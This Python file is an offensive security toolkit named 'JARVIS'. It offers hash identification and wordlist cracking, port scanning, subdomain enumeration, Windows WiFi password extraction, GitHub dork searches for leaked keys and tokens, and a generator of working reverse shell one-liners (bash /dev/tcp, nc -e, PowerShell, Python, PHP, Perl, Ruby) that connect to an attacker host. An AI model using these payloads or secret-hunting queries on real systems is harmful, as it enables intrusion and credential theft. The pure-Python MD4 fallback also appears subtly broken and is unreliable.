"""
JARVIS Cyber Toolkit
For Sir's authorized use only — CTF, pentesting, OSINT, local recon.
"""

import os
import re
import json
import ssl
import socket
import codecs
import base64
import hashlib
import secrets
import string
import urllib.parse
import urllib.request
import subprocess


# ────────────────────────────────────────────────────────────
# Hashes
# ────────────────────────────────────────────────────────────
KNOWN_HASHES = {
    32:  ["MD5", "NTLM", "MD4"],
    40:  ["SHA1"],
    56:  ["SHA-224"],
    64:  ["SHA-256", "SHA3-256"],
    96:  ["SHA-384", "SHA3-384"],
    128: ["SHA-512", "SHA3-512"],
}


def identify_hash(h):
    s = (h or "").strip()
    if not re.match(r"^[0-9a-fA-F]+$", s):
        return ["non-hex (try base64 or bcrypt)"]
    return KNOWN_HASHES.get(len(s), [f"unknown length {len(s)}"])


def hash_text(text, algo="sha256"):
    a = algo.lower().replace("-", "").replace("_", "")
    b = text.encode("utf-8")
    if a == "md5":     return hashlib.md5(b).hexdigest()
    if a == "sha1":    return hashlib.sha1(b).hexdigest()
    if a == "sha224":  return hashlib.sha224(b).hexdigest()
    if a == "sha256":  return hashlib.sha256(b).hexdigest()
    if a == "sha384":  return hashlib.sha384(b).hexdigest()
    if a == "sha512":  return hashlib.sha512(b).hexdigest()
    if a == "sha3256": return hashlib.sha3_256(b).hexdigest()
    if a == "sha3512": return hashlib.sha3_512(b).hexdigest()
    if a == "ntlm":
        return _md4_compat(text.encode("utf-16le")).hex()
    if a == "md4":
        return _md4_compat(b).hex()
    raise ValueError(f"unknown algo: {algo}")


def _md4_compat(data):
    """MD4 that works on OpenSSL 3.x where md4 is disabled by default."""
    # Try with usedforsecurity=False first (Python 3.9+, OpenSSL 3.x friendly)
    try:
        return hashlib.new("md4", data, usedforsecurity=False).digest()
    except (TypeError, ValueError):
        pass
    try:
        return hashlib.new("md4", data).digest()
    except (ValueError, TypeError):
        return _md4_pure(data)


def _md4_pure(data):
    """Pure-Python MD4 (RFC 1320). Slow but works anywhere."""
    import struct
    h = [0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476]
    msg = bytearray(data)
    orig_len = len(msg) * 8
    msg.append(0x80)
    while len(msg) % 64 != 56:
        msg.append(0)
    msg += struct.pack("<Q", orig_len)

    def F(x, y, z): return (x & y) | (~x & z) & 0xffffffff
    def G(x, y, z): return (x & y) | (x & z) | (y & z)
    def H(x, y, z): return x ^ y ^ z
    def rol(x, n): return ((x << n) | (x >> (32 - n))) & 0xffffffff

    for chunk_start in range(0, len(msg), 64):
        X = list(struct.unpack("<16I", msg[chunk_start:chunk_start + 64]))
        a, b_, c, d = h
        for i, s in zip([0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15], [3,7,11,19]*4):
            a, b_, c, d = d, b_, c, a
            a = rol((a + F(b_, c, d) + X[i]) & 0xffffffff, s)
        for i, s in zip([0,4,8,12,1,5,9,13,2,6,10,14,3,7,11,15], [3,5,9,13]*4):
            a, b_, c, d = d, b_, c, a
            a = rol((a + G(b_, c, d) + X[i] + 0x5a827999) & 0xffffffff, s)
        for i, s in zip([0,8,4,12,2,10,6,14,1,9,5,13,3,11,7,15], [3,9,11,15]*4):
            a, b_, c, d = d, b_, c, a
            a = rol((a + H(b_, c, d) + X[i] + 0x6ed9eba1) & 0xffffffff, s)
        h = [(h[0] + a) & 0xffffffff, (h[1] + b_) & 0xffffffff,
             (h[2] + c) & 0xffffffff, (h[3] + d) & 0xffffffff]
    return struct.pack("<4I", *h)


def crack_hash_dict(target, wordlist_path=None, algos=None, limit=2_000_000):
    """Dictionary attack against a hash. Returns dict with result or None."""
    target = (target or "").strip().lower()
    if not target:
        return {"error": "empty hash"}
    if algos is None:
        guessed = identify_hash(target)
        algos = [a for a in guessed if a.upper() in ("MD5", "SHA1", "SHA224",
                 "SHA256", "SHA384", "SHA512", "NTLM", "MD4")]
        if not algos:
            algos = ["MD5", "SHA1", "SHA256", "SHA512", "NTLM"]
    # Default wordlist path attempt
    candidate_paths = []
    if wordlist_path:
        candidate_paths.append(wordlist_path)
    home = os.path.expanduser("~")
    candidate_paths.extend([
        os.path.join("data", "wordlist.txt"),
        os.path.join("data", "rockyou.txt"),
        os.path.join(home, "Downloads", "rockyou.txt"),
        os.path.join(home, "Downloads", "wordlist.txt"),
    ])
    path = next((p for p in candidate_paths if p and os.path.exists(p)), None)
    if not path:
        return {"error": "no wordlist found",
                "tried": candidate_paths,
                "hint": "place a wordlist at data/wordlist.txt or pass --path"}

    tried = 0
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                w = line.rstrip("\r\n")
                if not w:
                    continue
                tried += 1
                if tried > limit:
                    return {"error": "limit exceeded", "tried": tried, "wordlist": path}
                for a in algos:
                    try:
                        if hash_text(w, a) == target:
                            return {"password": w, "algo": a,
                                    "tried": tried, "wordlist": path}
                    except Exception:
                        pass
    except Exception as e:
        return {"error": str(e)}
    return {"result": "not found", "tried": tried, "wordlist": path}


def random_password(length=20, symbols=True):
    chars = string.ascii_letters + string.digits
    if symbols:
        chars += "!@#$%^&*()-_=+[]{}<>?"
    return "".join(secrets.choice(chars) for _ in range(length))


# ────────────────────────────────────────────────────────────
# Encode / Decode
# ────────────────────────────────────────────────────────────
def encode(text, fmt):
    f = fmt.lower()
    b = text.encode("utf-8")
    if f in ("base64", "b64"):  return base64.b64encode(b).decode()
    if f in ("base32",):        return base64.b32encode(b).decode()
    if f in ("hex",):           return b.hex()
    if f in ("url",):           return urllib.parse.quote(text)
    if f in ("rot13",):         return codecs.encode(text, "rot_13")
    if f in ("binary","bin"):   return " ".join(format(x, "08b") for x in b)
    if f in ("ascii",):         return " ".join(str(x) for x in b)
    if f in ("morse",):
        M = {"A":".-","B":"-...","C":"-.-.","D":"-..","E":".","F":"..-.","G":"--.",
             "H":"....","I":"..","J":".---","K":"-.-","L":".-..","M":"--","N":"-.",
             "O":"---","P":".--.","Q":"--.-","R":".-.","S":"...","T":"-","U":"..-",
             "V":"...-","W":".--","X":"-..-","Y":"-.--","Z":"--..",
             "0":"-----","1":".----","2":"..---","3":"...--","4":"....-",
             "5":".....","6":"-....","7":"--...","8":"---..","9":"----."}
        return " ".join(M.get(c.upper(), "") for c in text)
    raise ValueError(f"unknown encoding: {fmt}")


def decode(text, fmt):
    f = fmt.lower()
    if f in ("base64", "b64"): return base64.b64decode(text).decode("utf-8", "replace")
    if f in ("base32",):       return base64.b32decode(text).decode("utf-8", "replace")
    if f in ("hex",):          return bytes.fromhex(text.replace(" ", "")).decode("utf-8", "replace")
    if f in ("url",):          return urllib.parse.unquote(text)
    if f in ("rot13",):        return codecs.decode(text, "rot_13")
    if f in ("binary","bin"):
        bits = text.replace(" ", "")
        out = bytearray()
        for i in range(0, len(bits), 8):
            out.append(int(bits[i:i+8], 2))
        return out.decode("utf-8", "replace")
    raise ValueError(f"unknown encoding: {fmt}")


# ────────────────────────────────────────────────────────────
# Network
# ────────────────────────────────────────────────────────────
COMMON_PORTS = [21,22,23,25,53,80,110,135,139,143,443,445,587,993,995,
                1433,1521,2049,2375,3000,3306,3389,4444,5000,5432,5900,
                5984,6379,6667,7001,8000,8008,8080,8081,8443,8888,9000,
                9090,9200,9300,11211,27017]


def port_scan(host, ports=None, timeout=0.5):
    if ports is None:
        ports = COMMON_PORTS
    open_ports = []
    for p in ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            if s.connect_ex((host, p)) == 0:
                open_ports.append(p)
            s.close()
        except Exception:
            pass
    return open_ports


def dns_lookup(host):
    try:
        ip = socket.gethostbyname(host)
        return {"host": host, "ip": ip}
    except Exception as e:
        return {"error": str(e)}


def reverse_dns(ip):
    try:
        return {"ip": ip, "host": socket.gethostbyaddr(ip)[0]}
    except Exception as e:
        return {"error": str(e)}


def http_headers(url):
    if not url.startswith("http"):
        url = "https://" + url
    try:
        req = urllib.request.Request(
            url,
            headers={"User-Agent": "Mozilla/5.0 JARVIS"},
        )
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        with urllib.request.urlopen(req, timeout=10, context=ctx) as r:
            return {
                "url": url,
                "status": r.status,
                "headers": dict(r.getheaders()),
            }
    except Exception as e:
        return {"error": str(e)}


def ip_info(ip=""):
    try:
        url = f"https://ipapi.co/{urllib.parse.quote(ip)}/json/" if ip else "https://ipapi.co/json/"
        with urllib.request.urlopen(url, timeout=10) as r:
            return json.loads(r.read())
    except Exception as e:
        return {"error": str(e)}


def public_ip():
    try:
        return urllib.request.urlopen("https://api.ipify.org", timeout=6).read().decode().strip()
    except Exception as e:
        return f"error: {e}"


def local_ips():
    out = {}
    try:
        out["hostname"] = socket.gethostname()
        out["local"]    = socket.gethostbyname(socket.gethostname())
    except Exception as e:
        out["error"] = str(e)
    return out


def ping(host, count=2):
    """Cross-platform ping using the OS tool."""
    n_flag = "-n" if os.name == "nt" else "-c"
    try:
        p = subprocess.run(["ping", n_flag, str(count), host],
                           capture_output=True, text=True, timeout=15)
        return {"output": p.stdout, "code": p.returncode}
    except Exception as e:
        return {"error": str(e)}


# ────────────────────────────────────────────────────────────
# Windows-specific: WiFi password recovery (own networks)
# ────────────────────────────────────────────────────────────
def wifi_profiles():
    try:
        p = subprocess.run(["netsh", "wlan", "show", "profiles"],
                           capture_output=True, text=True, timeout=10)
        names = re.findall(r":\s(.+)$", p.stdout, re.MULTILINE)
        return [n.strip() for n in names if n.strip()]
    except Exception as e:
        return [f"error: {e}"]


def wifi_password(ssid):
    """netsh requires elevated rights for key=clear on most setups —
    will return whatever it can."""
    try:
        p = subprocess.run(
            ["netsh", "wlan", "show", "profile", f'name={ssid}', "key=clear"],
            capture_output=True, text=True, timeout=10,
        )
        m = re.search(r"Key Content\s*:\s*(.+)", p.stdout)
        if m:
            return {"ssid": ssid, "password": m.group(1).strip()}
        return {"ssid": ssid, "error": "no key (may need admin)",
                "output_excerpt": p.stdout[:400]}
    except Exception as e:
        return {"error": str(e)}


# ════════════════════════════════════════════════════════════════
# CVE / VULNERABILITY INTELLIGENCE
# ════════════════════════════════════════════════════════════════
def cve_lookup(cve_id):
    """Fetch CVE details from NVD. Returns dict with id, summary, score."""
    cve_id = cve_id.strip().upper()
    if not re.match(r"^CVE-\d{4}-\d{4,}$", cve_id):
        return {"error": "Invalid CVE format. Expected CVE-YYYY-NNNN+"}
    try:
        url = f"https://services.nvd.nist.gov/rest/json/cves/2.0?cveId={cve_id}"
        with urllib.request.urlopen(url, timeout=15) as r:
            data = json.loads(r.read())
        items = data.get("vulnerabilities", [])
        if not items:
            return {"error": "CVE not found"}
        cve = items[0]["cve"]
        descs = cve.get("descriptions", [])
        summary = next((d["value"] for d in descs if d["lang"] == "en"), "")
        metrics = cve.get("metrics", {})
        score = severity = ""
        for k in ("cvssMetricV31", "cvssMetricV30", "cvssMetricV2"):
            if k in metrics and metrics[k]:
                m = metrics[k][0].get("cvssData", {})
                score = m.get("baseScore", "")
                severity = m.get("baseSeverity") or metrics[k][0].get("baseSeverity", "")
                break
        return {
            "id": cve_id,
            "score": score,
            "severity": severity,
            "summary": summary[:1000],
            "published": cve.get("published", ""),
            "url": f"https://nvd.nist.gov/vuln/detail/{cve_id}",
        }
    except Exception as e:
        return {"error": str(e)}


def recent_critical_cves(limit=5):
    """Critical CVEs published in the last 30 days, newest first."""
    from datetime import datetime, timedelta
    try:
        end = datetime.utcnow()
        start = end - timedelta(days=30)
        fmt = "%Y-%m-%dT%H:%M:%S.000"
        params = {
            "cvssV3Severity": "CRITICAL",
            "pubStartDate": start.strftime(fmt),
            "pubEndDate": end.strftime(fmt),
            "resultsPerPage": str(limit * 4),
        }
        url = "https://services.nvd.nist.gov/rest/json/cves/2.0?" + urllib.parse.urlencode(params)
        req = urllib.request.Request(url, headers={"User-Agent": "JARVIS"})
        with urllib.request.urlopen(req, timeout=20) as r:
            data = json.loads(r.read())
        items = data.get("vulnerabilities", [])
        items.sort(
            key=lambda v: v.get("cve", {}).get("published", ""),
            reverse=True,
        )
        out = []
        for v in items[:limit]:
            cve = v.get("cve", {})
            descs = cve.get("descriptions", [])
            summary = next((d["value"] for d in descs if d["lang"] == "en"), "")[:200]
            out.append({
                "id": cve.get("id", ""),
                "summary": summary,
                "published": cve.get("published", ""),
            })
        return out
    except Exception as e:
        return {"error": str(e)}


# ════════════════════════════════════════════════════════════════
# SUBDOMAIN ENUMERATION via crt.sh (no API key)
# ════════════════════════════════════════════════════════════════
def subdomain_enum(domain, limit=50):
    domain = domain.strip().lower().lstrip(".")
    if not domain or " " in domain:
        return {"error": "Invalid domain"}

    last_err = ""
    # crt.sh is sometimes slow — retry up to 3 times
    for attempt in range(3):
        try:
            url = f"https://crt.sh/?q=%25.{urllib.parse.quote(domain)}&output=json"
            req = urllib.request.Request(
                url, headers={"User-Agent": "Mozilla/5.0 JARVIS"})
            with urllib.request.urlopen(req, timeout=60) as r:
                data = json.loads(r.read())
            subs = set()
            for row in data:
                name = (row.get("name_value") or "").strip().lower()
                for line in name.split("\n"):
                    line = line.strip().lstrip("*.")
                    if line and line.endswith(domain):
                        subs.add(line)
            result = sorted(subs)[:limit]
            return {"domain": domain, "count": len(result), "subdomains": result}
        except Exception as e:
            last_err = str(e)
            continue

    # Fallback: hackertarget.com (free, no key)
    try:
        url = f"https://api.hackertarget.com/hostsearch/?q={urllib.parse.quote(domain)}"
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0 JARVIS"})
        with urllib.request.urlopen(req, timeout=20) as r:
            text = r.read().decode("utf-8", "ignore")
        subs = set()
        for line in text.splitlines():
            if "," in line:
                host = line.split(",")[0].strip().lower()
                if host.endswith(domain):
                    subs.add(host)
        result = sorted(subs)[:limit]
        if result:
            return {"domain": domain, "count": len(result),
                    "subdomains": result, "source": "hackertarget"}
    except Exception as e2:
        last_err += f" / fallback: {e2}"

    return {"error": last_err}


# ════════════════════════════════════════════════════════════════
# GITHUB DORK LINKS (for secret hunting)
# ════════════════════════════════════════════════════════════════
def github_dorks(target):
    """Return a list of pre-baked GitHub search URLs for the target."""
    q = urllib.parse.quote(target)
    base = "https://github.com/search?type=code&q="
    return [
        {"name": "AWS keys",         "url": f"{base}{q}+AKIA"},
        {"name": "API keys",         "url": f"{base}{q}+api_key"},
        {"name": "Passwords",        "url": f"{base}{q}+password"},
        {"name": "Bearer tokens",    "url": f"{base}{q}+Bearer"},
        {"name": ".env files",       "url": f"{base}{q}+filename%3A.env"},
        {"name": "config.json",      "url": f"{base}{q}+filename%3Aconfig.json"},
        {"name": "SSH private keys", "url": f"{base}{q}+BEGIN+RSA+PRIVATE+KEY"},
        {"name": "Database URLs",    "url": f"{base}{q}+mongodb%3A%2F%2F"},
    ]


# ════════════════════════════════════════════════════════════════
# REVERSE SHELL PAYLOAD GENERATOR
# ════════════════════════════════════════════════════════════════
def reverse_shell(shell_type, lhost, lport):
    """Return a reverse shell one-liner for the given target."""
    lhost = lhost.strip()
    lport = str(lport).strip()
    shell_type = shell_type.lower().strip()

    payloads = {
        "bash":
            f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        "sh":
            f"sh -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        "python":
            f"python -c 'import socket,subprocess,os;"
            f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            f"s.connect((\"{lhost}\",{lport}));"
            f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
            f"subprocess.call([\"/bin/sh\",\"-i\"])'",
        "python3":
            f"python3 -c 'import socket,subprocess,os;"
            f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            f"s.connect((\"{lhost}\",{lport}));"
            f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
            f"subprocess.call([\"/bin/sh\",\"-i\"])'",
        "powershell":
            f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});"
            f"$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};"
            f"while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;"
            f"$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
            f"$sendback = (iex $data 2>&1 | Out-String );"
            f"$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
            f"$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
            f"$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"",
        "nc":
            f"nc -e /bin/sh {lhost} {lport}",
        "ncmkfifo":
            f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
        "php":
            f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "perl":
            f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};"
            f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
            f"if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");"
            f"open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
        "ruby":
            f"ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;"
            f"exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
    }

    if shell_type == "list":
        return {"available": list(payloads.keys())}
    if shell_type in payloads:
        return {"type": shell_type, "lhost": lhost, "lport": lport,
                "payload": payloads[shell_type]}
    return {"error": f"Unknown shell type '{shell_type}'. "
                     f"Available: {', '.join(payloads.keys())}"}
